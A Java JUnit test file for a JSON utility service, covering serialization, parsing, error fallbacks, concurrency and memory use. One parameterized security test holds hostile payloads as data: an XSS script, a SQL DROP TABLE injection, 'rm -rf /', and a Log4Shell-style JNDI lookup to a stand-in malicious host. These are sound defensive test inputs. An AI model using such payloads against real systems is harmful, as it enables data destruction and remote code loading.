package com.fufu.terminal.util;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

/**
 * Comprehensive unit tests for JsonUtilityService including security, performance,
 * and error handling scenarios for production-ready validation.
 */
@ExtendWith(MockitoExtension.class)
class JsonUtilityServiceTest {

    @Mock
    private ObjectMapper objectMapper;

    @Mock
    private JsonNode jsonNode;

    private JsonUtilityService jsonUtilityService;

    @BeforeEach
    void setUp() {
        jsonUtilityService = new JsonUtilityService(objectMapper);
    }

    // Basic functionality tests
    @Test
    void toJsonString_withValidObject_returnsJsonString() throws Exception {
        // Given
        Map<String, String> testObject = new HashMap<>();
        testObject.put("key", "value");
        String expectedJson = "{\"key\":\"value\"}";

        when(objectMapper.writeValueAsString(testObject)).thenReturn(expectedJson);

        // When
        String result = jsonUtilityService.toJsonString(testObject);

        // Then
        assertEquals(expectedJson, result);
    }

    @Test
    void toJsonString_withNullObject_returnsNull() {
        // When
        String result = jsonUtilityService.toJsonString(null);

        // Then
        assertNull(result);
    }

    @Test
    void toJsonString_withSerializationError_returnsNull() throws Exception {
        // Given
        Object testObject = new Object();
        when(objectMapper.writeValueAsString(any())).thenThrow(new JsonProcessingException("Serialization error") {});

        // When
        String result = jsonUtilityService.toJsonString(testObject);

        // Then
        assertNull(result);
    }

    @Test
    void toJsonString_withFallback_returnsFallbackOnError() throws Exception {
        // Given
        Object testObject = new Object();
        String fallback = "{}";
        when(objectMapper.writeValueAsString(any())).thenThrow(new JsonProcessingException("Serialization error") {});

        // When
        String result = jsonUtilityService.toJsonString(testObject, fallback);

        // Then
        assertEquals(fallback, result);
    }

    @Test
    void toJsonString_withFallback_returnsActualJsonOnSuccess() throws Exception {
        // Given
        Map<String, String> testObject = Map.of("key", "value");
        String expectedJson = "{\"key\":\"value\"}";
        String fallback = "{}";
        when(objectMapper.writeValueAsString(testObject)).thenReturn(expectedJson);

        // When
        String result = jsonUtilityService.toJsonString(testObject, fallback);

        // Then
        assertEquals(expectedJson, result);
    }

    @Test
    void fromJsonString_withValidJson_returnsObject() throws Exception {
        // Given
        String json = "{\"key\":\"value\"}";
        Map<String, String> expectedObject = new HashMap<>();
        expectedObject.put("key", "value");

        when(objectMapper.readValue(json, Map.class)).thenReturn(expectedObject);

        // When
        Map result = jsonUtilityService.fromJsonString(json, Map.class);

        // Then
        assertEquals(expectedObject, result);
    }

    @Test
    void fromJsonString_withNullJson_returnsNull() {
        // When
        Object result = jsonUtilityService.fromJsonString(null, Object.class);

        // Then
        assertNull(result);
    }

    @Test
    void fromJsonString_withEmptyJson_returnsNull() {
        // When
        Object result = jsonUtilityService.fromJsonString("", Object.class);

        // Then
        assertNull(result);
    }

    @Test
    void fromJsonString_withWhitespaceOnlyJson_returnsNull() {
        // When
        Object result = jsonUtilityService.fromJsonString("   \t\n  ", Object.class);

        // Then
        assertNull(result);
    }

    @Test
    void fromJsonString_withParsingError_returnsNull() throws Exception {
        // Given
        String invalidJson = "invalid json";
        when(objectMapper.readValue(invalidJson, Object.class)).thenThrow(new JsonProcessingException("Parsing error") {});

        // When
        Object result = jsonUtilityService.fromJsonString(invalidJson, Object.class);

        // Then
        assertNull(result);
    }

    @Test
    void isValidJson_withValidJson_returnsTrue() throws Exception {
        // Given
        String validJson = "{\"key\":\"value\"}";
        when(objectMapper.readTree(validJson)).thenReturn(jsonNode);

        // When
        boolean result = jsonUtilityService.isValidJson(validJson);

        // Then
        assertTrue(result);
    }

    @Test
    void isValidJson_withInvalidJson_returnsFalse() throws Exception {
        // Given
        String invalidJson = "invalid json";
        when(objectMapper.readTree(invalidJson)).thenThrow(new JsonProcessingException("Invalid JSON") {});

        // When
        boolean result = jsonUtilityService.isValidJson(invalidJson);

        // Then
        assertFalse(result);
    }

    @Test
    void isValidJson_withNullJson_returnsFalse() {
        // When
        boolean result = jsonUtilityService.isValidJson(null);

        // Then
        assertFalse(result);
    }

    @Test
    void isValidJson_withEmptyJson_returnsFalse() {
        // When
        boolean result = jsonUtilityService.isValidJson("");

        // Then
        assertFalse(result);
    }

    // Security Tests - JSON Injection and Large Payload Defense
    @ParameterizedTest
    @ValueSource(strings = {
        "{\"script\": \"<script>alert('xss')</script>\"}",
        "{\"sql\": \"'; DROP TABLE users; --\"}",
        "{\"command\": \"rm -rf / --no-preserve-root\"}",
        "{\"injection\": \"${jndi:ldap://malicious.com/exploit}\"}"
    })
    void toJsonString_withMaliciousPayloads_handlesSecurely(String maliciousContent) throws Exception {
        // Given
        Map<String, String> maliciousObject = Map.of("payload", maliciousContent);
        String expectedJson = "{\"payload\":\"" + maliciousContent + "\"}";
        when(objectMapper.writeValueAsString(maliciousObject)).thenReturn(expectedJson);

        // When
        String result = jsonUtilityService.toJsonString(maliciousObject);

        // Then
        assertNotNull(result);
        assertTrue(result.contains(maliciousContent));
        // Serialization should not execute or interpret the malicious content
    }

    @Test
    void fromJsonString_withLargeJsonPayload_handlesEfficiently() throws Exception {
        // Given
        StringBuilder largeJsonBuilder = new StringBuilder("{");
        for (int i = 0; i < 1000; i++) {
            if (i > 0) largeJsonBuilder.append(",");
            largeJsonBuilder.append("\"key").append(i).append("\":\"value").append(i).append("\"");
        }
        largeJsonBuilder.append("}");
        String largeJson = largeJsonBuilder.toString();

        Map<String, String> expectedResult = new HashMap<>();
        when(objectMapper.readValue(eq(largeJson), eq(Map.class))).thenReturn(expectedResult);

        // When
        long startTime = System.currentTimeMillis();
        Map result = jsonUtilityService.fromJsonString(largeJson, Map.class);
        long endTime = System.currentTimeMillis();

        // Then
        assertNotNull(result);
        assertTrue((endTime - startTime) < 1000, "Large JSON parsing should complete within 1 second");
    }

    @Test
    void isValidJson_withDeeplyNestedJson_detectsValidStructure() throws Exception {
        // Given
        String deeplyNestedJson = "{\"level1\":{\"level2\":{\"level3\":{\"level4\":\"value\"}}}}";
        when(objectMapper.readTree(deeplyNestedJson)).thenReturn(jsonNode);

        // When
        boolean result = jsonUtilityService.isValidJson(deeplyNestedJson);

        // Then
        assertTrue(result);
    }

    @Test
    void isValidJson_withMalformedNestedJson_returnsFalse() throws Exception {
        // Given
        String malformedJson = "{\"level1\":{\"level2\":{\"level3\":{\"level4\":}}";
        when(objectMapper.readTree(malformedJson)).thenThrow(new JsonProcessingException("Malformed JSON") {});

        // When
        boolean result = jsonUtilityService.isValidJson(malformedJson);

        // Then
        assertFalse(result);
    }

    // Performance and Concurrency Tests
    @Test
    void toJsonString_concurrentAccess_threadSafe() throws Exception {
        // Given
        Map<String, String> testObject = Map.of("key", "value");
        String expectedJson = "{\"key\":\"value\"}";
        when(objectMapper.writeValueAsString(testObject)).thenReturn(expectedJson);

        ExecutorService executor = Executors.newFixedThreadPool(10);
        List<CompletableFuture<String>> futures = new ArrayList<>();

        // When
        for (int i = 0; i < 100; i++) {
            CompletableFuture<String> future = CompletableFuture.supplyAsync(
                () -> jsonUtilityService.toJsonString(testObject), executor);
            futures.add(future);
        }

        // Then
        CompletableFuture<Void> allFutures = CompletableFuture.allOf(
            futures.toArray(new CompletableFuture[0]));

        allFutures.join(); // Wait for all to complete

        for (CompletableFuture<String> future : futures) {
            assertEquals(expectedJson, future.get());
        }

        executor.shutdown();
    }

    @Test
    void fromJsonString_concurrentAccess_threadSafe() throws Exception {
        // Given
        String json = "{\"key\":\"value\"}";
        Map<String, String> expectedObject = Map.of("key", "value");
        when(objectMapper.readValue(json, Map.class)).thenReturn(expectedObject);

        ExecutorService executor = Executors.newFixedThreadPool(10);
        List<CompletableFuture<Map>> futures = new ArrayList<>();

        // When
        for (int i = 0; i < 100; i++) {
            CompletableFuture<Map> future = CompletableFuture.supplyAsync(
                () -> jsonUtilityService.fromJsonString(json, Map.class), executor);
            futures.add(future);
        }

        // Then
        CompletableFuture<Void> allFutures = CompletableFuture.allOf(
            futures.toArray(new CompletableFuture[0]));

        allFutures.join();

        for (CompletableFuture<Map> future : futures) {
            assertEquals(expectedObject, future.get());
        }

        executor.shutdown();
    }

    // Edge Cases and Boundary Testing
    @Test
    void toJsonString_withCircularReference_handlesGracefully() throws Exception {
        // Given
        Object circularObject = new Object();
        when(objectMapper.writeValueAsString(circularObject))
            .thenThrow(new JsonProcessingException("Circular reference") {});

        // When
        String result = jsonUtilityService.toJsonString(circularObject);

        // Then
        assertNull(result);
    }

    @Test
    void fromJsonString_withSpecialCharacters_handlesCorrectly() throws Exception {
        // Given
        String jsonWithSpecialChars = "{\"unicode\":\"\\u0048\\u0065\\u006C\\u006C\\u006F\",\"emoji\":\"😀\"}";
        Map<String, String> expectedObject = Map.of("unicode", "Hello", "emoji", "😀");
        when(objectMapper.readValue(jsonWithSpecialChars, Map.class)).thenReturn(expectedObject);

        // When
        Map result = jsonUtilityService.fromJsonString(jsonWithSpecialChars, Map.class);

        // Then
        assertEquals(expectedObject, result);
    }

    @Test
    void isValidJson_withJsonArray_returnsTrue() throws Exception {
        // Given
        String jsonArray = "[{\"key\":\"value1\"},{\"key\":\"value2\"}]";
        when(objectMapper.readTree(jsonArray)).thenReturn(jsonNode);

        // When
        boolean result = jsonUtilityService.isValidJson(jsonArray);

        // Then
        assertTrue(result);
    }

    @Test
    void isValidJson_withJsonPrimitive_returnsTrue() throws Exception {
        // Given
        String jsonPrimitive = "\"simple string\"";
        when(objectMapper.readTree(jsonPrimitive)).thenReturn(jsonNode);

        // When
        boolean result = jsonUtilityService.isValidJson(jsonPrimitive);

        // Then
        assertTrue(result);
    }

    // Error Recovery and Fallback Testing
    @Test
    void toJsonString_withFallback_handlesDifferentErrorTypes() throws Exception {
        // Given
        Object problematicObject = new Object();
        String fallback = "{\"error\":\"serialization_failed\"}";

        // Test different exception types
        when(objectMapper.writeValueAsString(problematicObject))
            .thenThrow(new JsonProcessingException("Processing error") {})
            .thenThrow(new RuntimeException("Runtime error"))
            .thenThrow(new OutOfMemoryError("Memory error"));

        // When & Then
        assertEquals(fallback, jsonUtilityService.toJsonString(problematicObject, fallback));
        assertEquals(fallback, jsonUtilityService.toJsonString(problematicObject, fallback));
        assertEquals(fallback, jsonUtilityService.toJsonString(problematicObject, fallback));
    }

    @Test
    void fromJsonString_withTypeCoercion_handlesGracefully() throws Exception {
        // Given
        String numberAsString = "123";
        when(objectMapper.readValue(numberAsString, String.class))
            .thenThrow(new JsonProcessingException("Type mismatch") {});

        // When
        String result = jsonUtilityService.fromJsonString(numberAsString, String.class);

        // Then
        assertNull(result);
    }

    // Memory and Resource Management Tests
    @Test
    void toJsonString_withLargeObject_managesMemoryEfficiently() throws Exception {
        // Given
        Map<String, String> largeObject = new HashMap<>();
        for (int i = 0; i < 10000; i++) {
            largeObject.put("key" + i, "value" + i + "_".repeat(100)); // Large values
        }

        String largeJson = "large_json_result";
        when(objectMapper.writeValueAsString(largeObject)).thenReturn(largeJson);

        // When
        long beforeMemory = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();
        String result = jsonUtilityService.toJsonString(largeObject);
        long afterMemory = Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory();

        // Then
        assertNotNull(result);
        assertEquals(largeJson, result);
        // Memory increase should not be excessive (less than 100MB for test)
        assertTrue((afterMemory - beforeMemory) < 100 * 1024 * 1024,
            "Memory usage should be reasonable for large objects");
    }
}
